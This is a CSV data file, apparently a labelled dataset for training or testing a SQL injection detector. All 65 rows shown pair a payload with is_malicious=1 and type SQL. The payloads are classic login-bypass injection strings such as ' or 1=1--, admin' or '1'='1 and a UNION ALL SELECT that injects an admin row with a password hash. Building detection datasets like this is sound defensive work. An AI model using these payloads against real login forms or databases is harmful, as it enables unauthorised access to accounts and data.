,payload,is_malicious,injection_type
0,﻿'-',1,SQL
1,' ',1,SQL
2,'&',1,SQL
3,'^',1,SQL
4,'*',1,SQL
5,' or ''-',1,SQL
6,' or '' ',1,SQL
7,' or ''&',1,SQL
8,' or ''^',1,SQL
9,' or ''*',1,SQL
10,"""-""",1,SQL
11,""" """,1,SQL
12,"""&""",1,SQL
13,"""^""",1,SQL
14,"""*""",1,SQL
15,""" or """"-""",1,SQL
16,""" or """" """,1,SQL
17,""" or """"&""",1,SQL
18,""" or """"^""",1,SQL
19,""" or """"*""",1,SQL
20,or true--,1,SQL
21,""" or true--",1,SQL
22,' or true--,1,SQL
23,""") or true--",1,SQL
24,') or true--,1,SQL
25,' or 'x'='x,1,SQL
26,') or ('x')=('x,1,SQL
27,')) or (('x'))=(('x,1,SQL
28,""" or ""x""=""x",1,SQL
29,""") or (""x"")=(""x",1,SQL
30,""")) or ((""x""))=((""x",1,SQL
31,or 1=1,1,SQL
32,or 1=1--,1,SQL
33,or 1=1#,1,SQL
34,or 1=1/*,1,SQL
35,admin' --,1,SQL
36,admin' #,1,SQL
37,admin'/*,1,SQL
38,admin' or '1'='1,1,SQL
39,admin' or '1'='1'--,1,SQL
40,admin' or '1'='1'#,1,SQL
41,admin' or '1'='1'/*,1,SQL
42,admin'or 1=1 or ''=',1,SQL
43,admin' or 1=1,1,SQL
44,admin' or 1=1--,1,SQL
45,admin' or 1=1#,1,SQL
46,admin' or 1=1/*,1,SQL
47,admin') or ('1'='1,1,SQL
48,admin') or ('1'='1'--,1,SQL
49,admin') or ('1'='1'#,1,SQL
50,admin') or ('1'='1'/*,1,SQL
51,admin') or '1'='1,1,SQL
52,admin') or '1'='1'--,1,SQL
53,admin') or '1'='1'#,1,SQL
54,admin') or '1'='1'/*,1,SQL
55,"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",1,SQL
56,"admin"" --",1,SQL
57,"admin"" #",1,SQL
58,"admin""/*",1,SQL
59,"admin"" or ""1""=""1",1,SQL
60,"admin"" or ""1""=""1""--",1,SQL
61,"admin"" or ""1""=""1""#",1,SQL
62,"admin"" or ""1""=""1""/*",1,SQL
63,"admin""or 1=1 or """"=""",1,SQL
64,"admin"" or 1=1",1,SQL
